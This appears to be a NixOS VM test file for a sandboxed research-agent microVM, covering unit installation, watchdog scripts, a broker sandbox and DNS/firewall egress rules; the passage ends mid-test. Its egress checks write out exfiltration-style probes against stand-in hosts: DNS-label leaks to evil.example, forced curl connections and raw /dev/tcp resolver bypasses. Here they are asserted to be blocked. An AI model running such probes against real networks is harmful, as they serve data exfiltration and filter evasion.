# vm-microvm: research-agent microvm unit installation + agenix wiring.
#
# Asserts:
#   - install-microvm-research-agent.service exists and runs
#   - microvm@research-agent.service template lands in /etc/systemd/system
#   - /var/lib/research-agent/vm-ssh (host-side persisted ssh-host-keys
#     share) is created via systemd.tmpfiles, owner root mode 700
#   - /var/lib/research-agent/tool-cache/{prv,bolagsverket} (persistent
#     jail tool-cache share) created via systemd.tmpfiles, 0777 jonathan
#   - the guest's egress policy AT RUNTIME (nodes `agent` + `upstream`):
#     the agent node imports the very module the guest imports
#     (modules/nixos/research-agent-egress.nix) and resolves through a
#     fake upstream that serves api.anthropic.com with a rotating CNAME-chain shape
#     onto an "edge" address the test rotates. Asserted: a freshly
#     rotated address is connectable as soon as the agent resolves it;
#     an address the resolver never handed out is not, even for an
#     allowlisted name; an unlisted name (A, AAAA, PTR) is answered
#     NXDOMAIN by the agent's own resolver and the upstream never sees
#     the query (no DNS-label exfiltration); no guest process but
#     dnsmasq can query the upstream directly. Since the egress broker
#     (2026-10): the keyed API hosts (api.exa.ai, api.ebay.com) are no
#     longer resolvable from the guest; the guest reaches the broker's
#     port on the SLIRP gateway (10.0.2.2:8124) but not the scraper's
#     (10.0.2.2:8123).
#   - research-broker.service on the host, at runtime, with a stub
#     broker/server.py standing in for the research-agent code: inert
#     until the code exists; listens on 127.0.0.1:8124 only; admin socket
#     reachable by jonathan and not by another user; the sandboxed
#     process gets the eight API keys as credentials (not env), cannot
#     see /home or write its code dir, and can still reach the internet,
#     host loopback :8123 and the scraper bearer; systemd-analyze
#     exposure <= 2.5.
#
# Nested-VM gate: starting microvm@research-agent.service would require
# nested KVM in the outer test QEMU. Some CI / dev hosts don't expose
# /dev/kvm to nested guests, so this lane asserts that the module
# evaluates and its systemd unit landed. Full boot+ssh+egress smoke
# lives in interactive `nix run .#feature-vm` per the SessionStart
# HARD RULE.
#
# Run: nix build .#checks.x86_64-linux.vm-microvm -L
{ pkgs, inputs }:

let
  lib = pkgs.lib;

  # Stand-in for research-agent's broker/server.py (that code lives in the
  # research-agent repo and has its own hermetic suite). It exercises the
  # UNIT, not the broker: serves both inherited sockets and reports what
  # the sandboxed process can see and reach, so the lane proves the
  # sandbox does not break what the real broker needs (credentials,
  # code dirs, scraper bearer, curl_cffi upstream calls, host :8123) and
  # does hide what it must not see.
  stubBroker = pkgs.writeText "stub-broker-server.py" ''
    import json, os, socket, threading
    from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
    from urllib.parse import parse_qs, urlparse


    def attempt(fn):
        try:
            return ["ok", fn()]
        except Exception as e:
            return ["err", type(e).__name__]


    def http_get(url):
        from curl_cffi import requests
        return requests.get(url, timeout=10).status_code


    def write_code():
        with open("/run/rb/broker/x", "w") as f:
            f.write("x")


    def probe(listener, query):
        cdir = os.environ["CREDENTIALS_DIRECTORY"]
        out = {
            "listener": listener,
            "fdnames": os.environ.get("LISTEN_FDNAMES", ""),
            "uid": os.getuid(),
            "creds": {n: open(os.path.join(cdir, n)).read() for n in os.listdir(cdir)},
            "env_has_fake": any("FAKE-" in v for v in os.environ.values()),
            "home": attempt(lambda: sorted(os.listdir("/home"))),
            "write_code": attempt(write_code),
            "scraper_code": attempt(lambda: os.path.isdir("/run/rb/scraper")),
            "scraper_token": attempt(lambda: len(open("/var/lib/scraper-bearer/token").read()) > 0),
            "loopback_scraper": attempt(lambda: http_get("http://127.0.0.1:8123/")),
        }
        if "up" in query:
            out["upstream"] = attempt(lambda: http_get(query["up"][0]))
        return out


    class Handler(BaseHTTPRequestHandler):
        def address_string(self):
            return "peer"

        def do_GET(self):
            url = urlparse(self.path)
            if url.path == "/v1/health":
                body = b"ok"
            elif url.path == "/probe":
                body = json.dumps(probe(self.server.fdname, parse_qs(url.query))).encode()
            else:
                self.send_error(404)
                return
            self.send_response(200)
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)


    assert int(os.environ["LISTEN_PID"]) == os.getpid()
    names = os.environ["LISTEN_FDNAMES"].split(":")
    threads = []
    for i in range(int(os.environ["LISTEN_FDS"])):
        srv = ThreadingHTTPServer(("127.0.0.1", 0), Handler, bind_and_activate=False)
        srv.socket.close()
        srv.socket = socket.socket(fileno=3 + i)
        srv.fdname = names[i]
        t = threading.Thread(target=srv.serve_forever)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()
  '';
in
pkgs.testers.runNixOSTest {
  name = "vm-microvm";
  skipTypeCheck = true;

  nodes.dellan = { config, ... }: {
    imports = [
      inputs.agenix.nixosModules.default
      inputs.agenix-rekey.nixosModules.default
      inputs.home-manager.nixosModules.home-manager
      inputs.microvm.nixosModules.host
      ../hosts/dellan/default.nix
      ../modules/common.nix
    ];

    # Strip the laptop's real hardware/disk config — virtualisation module
    # provides a virtio rootfs and the test framework boots without a
    # bootloader.
    disabledModules = [ ../hosts/dellan/hardware-configuration.nix ];

    boot.loader.systemd-boot.enable = lib.mkForce false;
    boot.loader.efi.canTouchEfiVariables = lib.mkForce false;

    home-manager = {
      useGlobalPkgs = true;
      useUserPackages = true;
      # This lane builds its own home-manager block rather than going
      # through tests/lib/common.nix, so it needs the same specialArg the
      # two builders there pass. home/aggregator-embed.nix uses it in
      # `imports`, and a module argument resolved from `_module.args`
      # during import evaluation is an infinite recursion.
      extraSpecialArgs = { inherit (inputs) aggregator-src; };
      users.jonathan = import ../home/jonathan-linux.nix;
    };

    users.users.jonathan = {
      linger = true;
      initialPassword = lib.mkForce "test";
    };

    virtualisation = {
      memorySize = 4096;
      cores = 2;
      diskSize = 8192;
    };

    # microvm.nix test-mode overrides. The production dellan config tells
    # microvm.vms.research-agent to virtiofs-share three host dirs that
    # don't exist inside this nested test VM. Without stubs, virtiofsd
    # blocks ~5min waiting for sources and pushes multi-user.target
    # behind its timeout. We also disable the inner VM start: this lane
    # asserts unit *installation*, not boot. Full boot lives in
    # `nix run .#feature-vm`.
    systemd.tmpfiles.rules = [
      "d /home/jonathan/Repos 0755 jonathan users -"
      "d /home/jonathan/Repos/research-agent 0755 jonathan users -"
      "d /home/jonathan/Repos/research-agent/reports 0755 jonathan users -"
    ];
    systemd.services."install-microvm-research-agent".wantedBy =
      lib.mkForce [ ];
    systemd.services."microvm@research-agent".wantedBy = lib.mkForce [ ];
    systemd.services."microvm-virtiofsd@research-agent".wantedBy =
      lib.mkForce [ ];
    # Same stubs for the scraper sibling VM. This lane asserts unit
    # installation only; interactive boot lives in `nix run .#feature-vm`.
    systemd.services."install-microvm-scraper".wantedBy = lib.mkForce [ ];
    systemd.services."microvm@scraper".wantedBy = lib.mkForce [ ];
    systemd.services."microvm-virtiofsd@scraper".wantedBy = lib.mkForce [ ];
  };

  # The research-agent guest's egress policy, run for real. Same module
  # the guest imports; only the upstream resolver differs (the guest's is
  # SLIRP's 10.0.2.3). IPv6 off as in the guest.
  nodes.agent = { nodes, pkgs, ... }: {
    imports = [ ../modules/nixos/research-agent-egress.nix ];
    researchAgent.egress.upstreamDns = nodes.upstream.networking.primaryIPAddress;
    networking.enableIPv6 = false;
    environment.systemPackages = [ pkgs.curl pkgs.dig ];
  };

  # Stands in for "the internet": an authoritative-enough resolver plus a
  # TCP :443 listener on several addresses. api.anthropic.com is served
  # as a CNAME chain whose final A record (the Akamai edge) the test
  # rewrites to simulate rotation — api.ebay.com's real shape, measured
  # 2026-10-02 while it was still allowlisted. evil.example is not on the
  # allowlist. Plain HTTP on :443 is enough: the guest rule is
  # `tcp dport 443`, TLS is irrelevant to the firewall. log-queries is
  # the witness for "the upstream never saw it".
  nodes.upstream = { pkgs, ... }: {
    networking.firewall.enable = false;
    environment.systemPackages = [ pkgs.dig ];
    networking.interfaces.eth1.ipv4.addresses = lib.mkAfter (map
      (n: { address = "192.168.1.${toString n}"; prefixLength = 24; })
      [ 10 11 12 13 ]);
    services.dnsmasq = {
      enable = true;
      resolveLocalQueries = false;
      settings = {
        no-resolv = true;
        no-hosts = true;
        addn-hosts = "/run/fake-dns/hosts";
        # api.anthropic.com carries the rotating CNAME-chain shape (it
        # stays allowlisted). api.ebay.com keeps its real chain and
        # api.exa.ai an A record, so the upstream WOULD answer the keyed
        # API hosts the guest must no longer resolve.
        cname = [
          "api.anthropic.com,api-edge.anthropic-cdn.example"
          "api-edge.anthropic-cdn.example,edge.akamaiedge.net"
          "api.ebay.com,global-api.ebaycdn.net"
          "global-api.ebaycdn.net,edge.akamaiedge.net"
        ];
        local-ttl = 1;
        log-queries = true;
      };
    };
    systemd.tmpfiles.rules = [ "d /run/fake-dns 0755 root root -" ];
    systemd.services.dnsmasq.preStart = lib.mkBefore ''
      printf '192.168.1.10 edge.akamaiedge.net\n192.168.1.12 evil.example api.exa.ai\n' \
        > /run/fake-dns/hosts
    '';
    systemd.services.fake-cdn = {
      wantedBy = [ "multi-user.target" ];
      script = ''
        mkdir -p /srv/cdn && echo ok > /srv/cdn/index.html
        exec ${pkgs.python3}/bin/python3 -m http.server 443 --bind 0.0.0.0 --directory /srv/cdn
      '';
    };
  };

  testScript = { nodes, ... }: ''
    dellan.wait_for_unit("multi-user.target")

    # microvm.nix install-microvm-<name> oneshot exists and runs cleanly.
    # We disabled `wantedBy = [ multi-user.target ]` in the test
    # overrides, so trigger it explicitly to materialize the per-VM
    # files under /var/lib/microvms/<name>.
    dellan.succeed("systemctl start install-microvm-research-agent.service")
    dellan.succeed("test -d /var/lib/microvms/research-agent")
    dellan.succeed(
        "systemctl cat microvm@research-agent.service "
        "| grep -q 'Description='"
    )

    # The generated qemu runner must never pass exactly -m 2048: qemu's
    # microvm machine serves a corrupt DSDT when guest RAM ends exactly
    # at the 2 GiB boundary (microvm-nix/microvm.nix#171) and the guest
    # wedges pre-init, pinning a host core. Assert on the materialized
    # runner — the artifact qemu actually execs — not on the .nix source.
    dellan.fail(
        "grep -qE -- '-m 2048( |$)' "
        "/var/lib/microvms/research-agent/current/bin/microvm-run"
    )

    # The research VM's virtiofs shares, as virtiofsd will actually run
    # them: the scraper bearer is not among them (the host broker holds
    # it now). Read from the materialized supervisord programs, with the
    # other shares as the non-vacuity control.
    shared = set(dellan.succeed(
        "conf=$(grep -o '/nix/store/[^ \"]*-virtiofsd-supervisord.conf' "
        "/var/lib/microvms/research-agent/current/bin/virtiofsd-run) && "
        "grep -oh -- '--shared-dir=[^ ]*' $(sed -n 's/^command=//p' \"$conf\")"
    ).split())
    print(f"[diag] research-agent virtiofs shares: {sorted(shared)}")
    assert "--shared-dir=/var/lib/research-agent/tool-cache" in shared, (
        f"share listing found nothing usable: {shared}"
    )
    assert not any("scraper-bearer" in d for d in shared), (
        f"research VM still gets the scraper bearer share: {shared}"
    )

    # Persisted vm-ssh state dir must be in place before the VM boots.
    # The host module's systemd.tmpfiles.rules are the load-bearing piece.
    dellan.succeed("test -d /var/lib/research-agent/vm-ssh")
    perms = dellan.succeed(
        "stat -c '%a %U' /var/lib/research-agent/vm-ssh"
    ).strip()
    assert perms == "700 root", (
        f"vm-ssh dir perms expected '700 root', got {perms!r}"
    )

    # Persistent tool-cache dirs (PRV / Bolagsverket SQLite indexes,
    # shared RW into the jail). 0777 is the load-bearing part: writes
    # from inside the bwrap --unshare-user jail arrive as a non-owner
    # uid, so anything tighter breaks index builds (same empirical
    # reason run-agent.sh chmods its report file 666).
    for sub in ["prv", "bolagsverket"]:
        perms = dellan.succeed(
            f"stat -c '%a %U' /var/lib/research-agent/tool-cache/{sub}"
        ).strip()
        assert perms == "777 jonathan", (
            f"tool-cache/{sub} perms expected '777 jonathan', got {perms!r}"
        )

    # Health-check watchdog: the script must defer to operator-stopped
    # state cleanly, and the systemctl-restart command name must appear in the script body (a
    # rename of the microvm unit would silently break the watchdog).
    script_path = dellan.succeed(
        "systemctl cat research-agent-healthcheck.service "
        "| awk -F= '/^ExecStart=/{print $2}' | tr -d '\"'"
    ).strip()
    # Match the literal command issued on restart. --no-block keeps the
    # oneshot bounded (the unit's TimeoutStartSec is 30s); a regression
    # back to synchronous restart would let stuck activations stack
    # behind the 1-min timer.
    dellan.succeed(
        f"grep -q 'systemctl restart --no-block microvm@research-agent.service' {script_path}"
    )
    # Give-up latch: the watchdog must cap fruitless restarts (burst
    # counter + gave-up flag) and write the notification flag file the
    # user-session path unit watches. A regression to restart-forever
    # recreates the 2026-06-05 incident: a boot-wedged guest restart-
    # looped 62×/6h, silently pinning a host core the whole time.
    # Probe MUST pass `-t ed25519`, matching the guest's own hostKeys.
    # Without it, ssh-keyscan also probes rsa and ecdsa; the guest serves
    # neither, and those attempts hang until -T rather than failing
    # fast, so the probe intermittently fails against a healthy VM.
    # Measured 2026-07-31 on the live host: default scan 12/20 vs 18/20
    # with -t ed25519, driving 35-49 spurious restarts a day (321 in 8
    # days). The flag is derived from the guest's own
    # services.openssh.hostKeys, so this assertion also catches an
    # empty-list regression: the throw at eval time is the primary
    # guard, and `-t <empty> -p` would produce `-t -p 2223` after bash
    # collapses the double space, which ssh-keyscan answers with
    # "Unknown key type '-p'" and every probe fails unconditionally.
    for unit, port in (("research-agent-healthcheck", "2223"),
                       ("scraper-healthcheck", "2225")):
        probe = dellan.succeed(
            f"grep -ho 'ssh-keyscan[^|]*' "
            f"$(systemctl cat {unit}.service | sed -n 's/^ExecStart=//p')"
        )
        assert f"-t ed25519 -p {port}" in probe, (
            f"{unit} must scan only the ed25519 host key its guest serves, got: {probe}"
        )
        assert "-t  -p" not in probe and "-t -p" not in probe, (
            f"{unit} probe has empty -t argument (would fail every probe): {probe}"
        )

    dellan.succeed(f"grep -q 'restart-burst-count' {script_path}")
    dellan.succeed(f"grep -q 'GIVING UP' {script_path}")
    dellan.succeed(
        f"grep -q '/run/microvm-healthcheck-notify/research-agent' {script_path}"
    )
    # Offline gate: probe failures while the HOST is offline must not
    # count toward restarts/give-up (2026-07-07 false "VM DOWN"
    # incident). Precautionary since the guest stopped holding sshd
    # back on DNS; see research-agent-microvm-healthcheck.nix.
    dellan.succeed(f"grep -q 'host is offline' {script_path}")
    dellan.succeed(f"grep -q 'getent ahostsv4' {script_path}")
    # Busy gate: while a research call is dialing the VM the MCP keeps a
    # heartbeat fresh; the watchdog must NOT count a failed probe (and so
    # must not restart) while it's fresh — otherwise it kills the in-flight
    # research call (the 2026-07-30 mid-run-restart failure). Assert the
    # gate is wired and the shared /run dir is jonathan-writable so the
    # MCP can actually touch the heartbeat.
    dellan.succeed(f"grep -q '/run/research-agent/active' {script_path}")
    dellan.succeed(f"grep -q 'a research call is active' {script_path}")
    dellan.succeed("test -d /run/research-agent")
    aperms = dellan.succeed("stat -c '%a %U' /run/research-agent").strip()
    assert aperms == "755 jonathan", (
        f"/run/research-agent perms expected '755 jonathan', got {aperms!r}"
    )
    # Wedge-snapshot instrumentation: before the recovery restart destroys
    # the wedged qemu, the watchdog must capture the guest console (streamed
    # to the journal via the qemu stdio chardev) to a persistent, pruned
    # file — the only window the warm-reboot second-boot failure is still on
    # record. Assert the logic is wired and the persistent dir is root-only.
    dellan.succeed(f"grep -q 'snapshot_console' {script_path}")
    dellan.succeed(f"grep -q 'wedge-logs' {script_path}")
    dellan.succeed(
        f"grep -q 'journalctl -u microvm@research-agent.service' {script_path}"
    )
    dellan.succeed("test -d /var/lib/research-agent/wedge-logs")
    wperms = dellan.succeed(
        "stat -c '%a %U' /var/lib/research-agent/wedge-logs"
    ).strip()
    assert wperms == "700 root", (
        f"wedge-logs dir perms expected '700 root', got {wperms!r}"
    )
    # Notification chain: flag dir exists and is world-readable so the
    # user session can inotify it.
    notify_perms = dellan.succeed(
        "stat -c '%a %U' /run/microvm-healthcheck-notify"
    ).strip()
    assert notify_perms == "755 root", (
        f"notify flag dir perms expected '755 root', got {notify_perms!r}"
    )
    # Probe should treat operator-stopped microvm as a no-op (exit 0
    # silently) — otherwise an admin `systemctl stop microvm@...` would
    # be fought by the watchdog. The microvm unit is stopped in this
    # test (wantedBy mkForce []), so a fresh run must exit 0.
    dellan.succeed("systemctl start research-agent-healthcheck.service")

    # Count-file corruption MUST NOT brick the watchdog. Under `set -u`
    # without sanitization, non-numeric input would crash the
    # arithmetic and leave the script aborting forever each tick.
    # read_int must clamp garbage back to 0.
    dellan.succeed(
        "mkdir -p /run/research-agent-healthcheck "
        "&& printf 'abc\\n0\\n5garbage' > /run/research-agent-healthcheck/fail-count"
    )
    dellan.succeed("systemctl start research-agent-healthcheck.service")
    # Service must reach 'inactive' (oneshot exited 0), not 'failed'.
    rc = dellan.succeed(
        "systemctl is-failed research-agent-healthcheck.service || true"
    ).strip()
    assert rc != "failed", (
        f"watchdog must survive corrupted state file; got is-failed={rc!r}"
    )

    # ---------------------------------------------------------------
    # scraper microvm — same shape of assertions as research-agent,
    # plus the bearer-token init service that gates both VMs.
    # ---------------------------------------------------------------
    dellan.succeed("systemctl start install-microvm-scraper.service")
    dellan.succeed("test -d /var/lib/microvms/scraper")
    dellan.succeed(
        "systemctl cat microvm@scraper.service | grep -q 'Description='"
    )

    # Persisted scraper state dirs must be in place before the VM boots.
    dellan.succeed("test -d /var/lib/scraper/vm-ssh")
    perms = dellan.succeed(
        "stat -c '%a %U' /var/lib/scraper/vm-ssh"
    ).strip()
    assert perms == "700 root", (
        f"scraper vm-ssh dir perms expected '700 root', got {perms!r}"
    )

    # Bearer-token init service must exist and produce a token file when
    # invoked. The token is regenerated on every boot; consumers read it
    # via virtiofs on demand, so rotation = a single `systemctl restart`.
    dellan.succeed("test -d /var/lib/scraper-bearer")
    perms = dellan.succeed(
        "stat -c '%a %U' /var/lib/scraper-bearer"
    ).strip()
    assert perms == "755 root", (
        f"scraper-bearer dir perms expected '755 root', got {perms!r}"
    )
    dellan.succeed("systemctl start scraper-bearer-init.service")
    dellan.succeed("test -s /var/lib/scraper-bearer/token")
    token_perms = dellan.succeed(
        "stat -c '%a %U' /var/lib/scraper-bearer/token"
    ).strip()
    assert token_perms == "444 root", (
        f"scraper token file perms expected '444 root', got {token_perms!r}"
    )
    # Token shape: base64url, ~43 ASCII chars, no '=' / '+' / '/'.
    token_body = dellan.succeed(
        "cat /var/lib/scraper-bearer/token"
    ).strip()
    assert len(token_body) >= 32, (
        f"scraper token too short: got {len(token_body)} chars"
    )
    assert all(
        c.isalnum() or c in "-_" for c in token_body
    ), f"scraper token contains non-base64url chars: {token_body!r}"

    # Research-agent ↔ scraper egress allow rule is structurally inside
    # the guest VM's nftables ruleset, not visible from this outer test
    # node. The interactive `nix run .#feature-vm` lane covers end-to-end
    # reachability (render_shim posting to the scraper); skip a brittle
    # grep here.

    # ---------------------------------------------------------------
    # scraper healthcheck — mirror of research-agent watchdog.
    # ---------------------------------------------------------------
    scraper_script = dellan.succeed(
        "systemctl cat scraper-healthcheck.service "
        "| awk -F= '/^ExecStart=/{print $2}' | tr -d '\"'"
    ).strip()
    # Must restart the scraper unit (not research-agent's) on persistent
    # failure. A rename of the microvm unit would silently break this.
    dellan.succeed(
        f"grep -q 'systemctl restart --no-block microvm@scraper.service' {scraper_script}"
    )
    # Give-up latch + notify chain — mirror of the research-agent
    # assertions above.
    dellan.succeed(f"grep -q 'restart-burst-count' {scraper_script}")
    dellan.succeed(f"grep -q 'GIVING UP' {scraper_script}")
    dellan.succeed(
        f"grep -q '/run/microvm-healthcheck-notify/scraper' {scraper_script}"
    )
    # Probe operator-stopped microvm as a no-op (the scraper unit is
    # stopped in this test via wantedBy mkForce []), exit 0 silently.
    dellan.succeed("systemctl start scraper-healthcheck.service")
    rc = dellan.succeed(
        "systemctl is-failed scraper-healthcheck.service || true"
    ).strip()
    assert rc != "failed", (
        f"scraper watchdog must survive operator-stopped VM; got is-failed={rc!r}"
    )
    # Corrupted state file must NOT brick the watchdog (read_int clamp).
    dellan.succeed(
        "mkdir -p /run/scraper-healthcheck "
        "&& printf 'abc\\n0\\n5garbage' > /run/scraper-healthcheck/fail-count"
    )
    dellan.succeed("systemctl start scraper-healthcheck.service")
    rc = dellan.succeed(
        "systemctl is-failed scraper-healthcheck.service || true"
    ).strip()
    assert rc != "failed", (
        f"scraper watchdog must survive corrupted state; got is-failed={rc!r}"
    )

    # ---------------------------------------------------------------
    # research-agent guest egress, at runtime (nodes agent + upstream).
    # ---------------------------------------------------------------
    upstream.start()
    agent.start()
    upstream.wait_for_unit("dnsmasq.service")
    upstream.wait_for_unit("fake-cdn.service")
    upstream.wait_for_open_port(443)
    agent.wait_for_unit("multi-user.target")
    agent.wait_for_unit("dnsmasq.service")
    agent.wait_for_unit("systemd-resolved.service")

    def set_edge(ip):
        # Rotate api.anthropic.com's final A record, as Akamai does every few
        # seconds. local-ttl=1 + no caching on the agent side means the
        # next lookup sees it; sleep past the TTL anyway.
        upstream.succeed(
            f"printf '{ip} edge.akamaiedge.net\\n192.168.1.12 evil.example api.exa.ai\\n' "
            "> /run/fake-dns/hosts && systemctl reload dnsmasq.service"
        )
        agent.sleep(2)

    def connect(name, extra=""):
        # %{remote_ip}: which address the agent actually reached.
        return agent.succeed(
            f"curl -sS -m 5 -o /dev/null -w '%{{remote_ip}}' {extra} http://{name}:443/"
        ).strip()

    def egress_set():
        return agent.succeed("nft list set inet filter research_allowed")

    # Nothing has been resolved yet, so nothing is allowed yet.
    print("[diag] set at boot:\n" + egress_set())
    assert "192.168.1." not in egress_set(), "egress set must start empty"

    # 1. Allowlisted name behind a CNAME chain: reachable, via the edge.
    ip = connect("api.anthropic.com")
    assert ip == "192.168.1.10", f"expected edge 192.168.1.10, reached {ip!r}"

    # 2. The edge rotates to an address nobody has seen before. The
    #    boot-time/10-min-refresh design failed exactly here.
    set_edge("192.168.1.11")
    ip = connect("api.anthropic.com")
    assert ip == "192.168.1.11", f"rotated edge not reached, got {ip!r}"

    # 3. Rotate again, but connect to the new address WITHOUT asking the
    #    resolver: allowlisted name or not, an address the resolver never
    #    handed out stays closed. Then resolve normally: open.
    set_edge("192.168.1.13")
    agent.fail(
        "curl -sS -m 5 -o /dev/null --resolve api.anthropic.com:443:192.168.1.13 "
        "http://api.anthropic.com:443/"
    )
    ip = connect("api.anthropic.com")
    assert ip == "192.168.1.13", f"edge not opened by resolution, got {ip!r}"

    assert "192.168.1.10" in egress_set(), "resolved edge address must be in the egress set"

    # 4. Unlisted names never leave the guest as DNS. Control first: the
    #    upstream itself WOULD answer evil.example, so the NXDOMAIN below
    #    is the agent's resolver refusing to forward, not the upstream.
    upstream.succeed("dig +short @127.0.0.1 evil.example | grep -qx 192.168.1.12")
    for name in ["exfil-test.example.com", "c2VjcmV0.evil.example"]:
        agent.fail(f"getent ahostsv4 {name}")
        for qtype in ["A", "AAAA"]:
            status = agent.succeed(
                f"dig +time=3 +tries=1 @127.0.0.1 {name} {qtype} | grep -o 'status: [A-Z]*'"
            ).strip()
            assert status == "status: NXDOMAIN", f"{name} {qtype}: {status!r}"
    # Reverse lookup of an address /etc/hosts doesn't name (dnsmasq
    # answers the test nodes' own addresses from /etc/hosts, locally).
    status = agent.succeed(
        "dig +time=3 +tries=1 @127.0.0.1 -x 203.0.113.7 | grep -o 'status: [A-Z]*'"
    ).strip()
    assert status == "status: NXDOMAIN", f"PTR 203.0.113.7: {status!r}"
    upstream_log = upstream.succeed("journalctl -u dnsmasq.service --no-pager")
    # Positive control: the log does record what the agent forwarded.
    assert "query[A] api.anthropic.com from" in upstream_log, "upstream query log not working"
    for leaked in ["exfil-test", "c2VjcmV0", "7.113.0.203.in-addr.arpa"]:
        assert leaked not in upstream_log, f"{leaked!r} reached the upstream resolver"
    # And the firewall still holds for the unlisted name's address even
    # if the agent already knows it.
    upstream.succeed("curl -sS -m 5 -o /dev/null http://192.168.1.12:443/")
    agent.fail(
        "curl -sS -m 5 -o /dev/null --resolve evil.example:443:192.168.1.12 "
        "http://evil.example:443/"
    )

    # 5. Port 53 is open only towards the configured upstream resolver,
    #    and only for dnsmasq. upstream's dnsmasq listens on every
    #    address, so .12:53 accepts TCP from an unfiltered node (dellan,
    #    same vlan) — not from the agent. A root process on the agent
    #    asking the upstream directly (skipping dnsmasq's name filter)
    #    gets no answer, even for an allowlisted name.
    dellan.succeed("timeout 6 bash -c 'exec 3<>/dev/tcp/192.168.1.12/53'")
    agent.fail("timeout 6 bash -c 'exec 3<>/dev/tcp/192.168.1.12/53'")
    agent.fail("dig +time=2 +tries=1 @${nodes.upstream.networking.primaryIPAddress} api.anthropic.com")
    agent.fail("dig +tcp +time=2 +tries=1 @${nodes.upstream.networking.primaryIPAddress} api.anthropic.com")
    # 6. Broker yes, scraper no. In prod 10.0.2.2 is SLIRP's gateway =
    #    host loopback, where research-broker listens on :8124 and the
    #    scraper's hostfwd on :8123. upstream plays the gateway with the
    #    same listener on both ports; the agent may reach only the
    #    broker's, so every render goes through the broker's URL gate.
    #    Each test node also has its OWN QEMU SLIRP NIC on eth0, in the
    #    same 10.0.2.0/24; take it down so 10.0.2.x is reached over the
    #    test vlan (eth1), or the checks fail for routing reasons.
    for m in (agent, upstream):
        m.succeed("ip link set eth0 down")
    upstream.succeed(
        "ip addr replace 10.0.2.2/24 dev eth1",
        "mkdir -p /srv/gw && echo gw-ok > /srv/gw/index.html",
        "systemd-run --unit=fake-broker ${pkgs.python3}/bin/python3 -m http.server 8124 --bind 10.0.2.2 --directory /srv/gw",
        "systemd-run --unit=fake-scraper ${pkgs.python3}/bin/python3 -m http.server 8123 --bind 10.0.2.2 --directory /srv/gw",
    )
    agent.succeed("ip addr replace 10.0.2.16/24 dev eth1")
    agent.succeed("ip route get 10.0.2.2 | grep -q 'dev eth1'")
    # Both listeners are up (control), so the refusal below is the policy.
    for port in (8123, 8124):
        upstream.wait_until_succeeds(f"${pkgs.curl}/bin/curl -sSf -m 2 http://10.0.2.2:{port}/")
    out = agent.succeed("curl -sS -m 5 http://10.0.2.2:8124/")
    assert out.strip() == "gw-ok", f"agent cannot reach the broker port: {out!r}"
    agent.fail("curl -sS -m 5 -o /dev/null http://10.0.2.2:8123/")

    # 7. The keyed API hosts are off the allowlist: the agent's resolver
    #    answers NXDOMAIN and never asks the upstream — which WOULD
    #    answer both (control first).
    upstream.succeed("dig +short @127.0.0.1 api.exa.ai | grep -qx 192.168.1.12")
    upstream.succeed("dig +short @127.0.0.1 api.ebay.com | grep -q '^192\\.168\\.1\\.'")
    for name in ["api.exa.ai", "api.ebay.com"]:
        agent.fail(f"getent ahostsv4 {name}")
    agent.succeed("getent ahostsv4 api.anthropic.com")
    upstream_log = upstream.succeed("journalctl -u dnsmasq.service --no-pager")
    agent_ip = "${nodes.agent.networking.primaryIPAddress}"
    assert f"query[A] api.anthropic.com from {agent_ip}" in upstream_log, "agent queries not in upstream log"
    for name in ["api.exa.ai", "api.ebay.com"]:
        assert f"query[A] {name} from {agent_ip}" not in upstream_log, f"{name} reached the upstream resolver"

    # ---------------------------------------------------------------
    # research-broker on the host (node dellan), at runtime, with the
    # stub server.py (see `stubBroker`) in place of the research-agent
    # code. The unit, its sockets and its sandbox are what is tested.
    # ---------------------------------------------------------------
    import json, re

    # Inert until the code lands: no listener, nothing trigger-looping.
    for unit in ("research-broker.socket", "research-broker-admin.socket"):
        state = dellan.succeed(f"systemctl show -P ActiveState {unit}").strip()
        assert state == "inactive", f"{unit} must stay inert without broker/server.py, got {state}"
    dellan.fail("ss -ltnH 'sport = :8124' | grep -q .")

    dellan.succeed(
        "install -D -m 0644 -o jonathan ${stubBroker} /home/jonathan/Repos/research-agent/broker/server.py",
        "install -d -m 0755 -o jonathan /home/jonathan/Repos/research-agent/scraper",
    )
    # No secret decrypts in a test VM (no host key): plant fake values at
    # the exact paths the unit loads, taken from its own LoadCredential.
    broker_creds = [c.split(":", 1) for c in json.loads('${builtins.toJSON nodes.dellan.systemd.services.research-broker.serviceConfig.LoadCredential}')]
    for name, path in broker_creds:
        dellan.succeed(
            f"d=$(readlink -m $(dirname {path})) && mkdir -p \"$d\" && "
            f"printf 'FAKE-%s' {name} > \"$d/$(basename {path})\" && chmod 0400 \"$d/$(basename {path})\""
        )
    dellan.succeed("systemctl start research-broker.socket research-broker-admin.socket")

    # The VM listener is host loopback :8124 and nothing else.
    listen = dellan.succeed("ss -ltnH 'sport = :8124' | awk '{print $4}'").split()
    assert listen == ["127.0.0.1:8124"], f"broker must listen on exactly 127.0.0.1:8124, got {listen}"
    perms = dellan.succeed("stat -c '%a %U' /run/research-broker/admin.sock").strip()
    assert perms == "600 jonathan", f"admin socket must be 0600 jonathan, got {perms!r}"

    # Socket activation over TCP, as the research VM would trigger it.
    out = dellan.succeed("${pkgs.curl}/bin/curl -sS -m 30 http://127.0.0.1:8124/v1/health")
    assert out == "ok", f"broker health via 127.0.0.1:8124: {out!r}"
    dellan.succeed("systemctl is-active research-broker.service")
    vm_probe = json.loads(dellan.succeed("${pkgs.curl}/bin/curl -sS -m 30 http://127.0.0.1:8124/probe"))
    assert vm_probe["listener"] == "vm", vm_probe

    # Admin socket: jonathan (the MCP server) gets in, another user does not.
    dellan.fail(
        "runuser -u nobody -- ${pkgs.curl}/bin/curl -sS -m 5 "
        "--unix-socket /run/research-broker/admin.sock http://admin/v1/health"
    )
    # Stands in for the scraper VM's hostfwd on host loopback :8123.
    dellan.succeed(
        "systemd-run --unit=fake-scraper-hostfwd ${pkgs.python3}/bin/python3 "
        "-m http.server 8123 --bind 127.0.0.1 --directory /var/empty"
    )
    dellan.wait_for_open_port(8123)
    up = "http://upstream:443/"
    probe = json.loads(dellan.succeed(
        "runuser -u jonathan -- ${pkgs.curl}/bin/curl -sS -m 60 "
        f"--unix-socket /run/research-broker/admin.sock 'http://admin/probe?up={up}'"
    ))
    print(f"[diag] broker sandbox probe: {probe}")
    assert probe["listener"] == "admin", probe
    assert sorted(probe["fdnames"].split(":")) == ["admin", "vm"], probe["fdnames"]
    # DynamicUser: a transient uid, neither root nor jonathan.
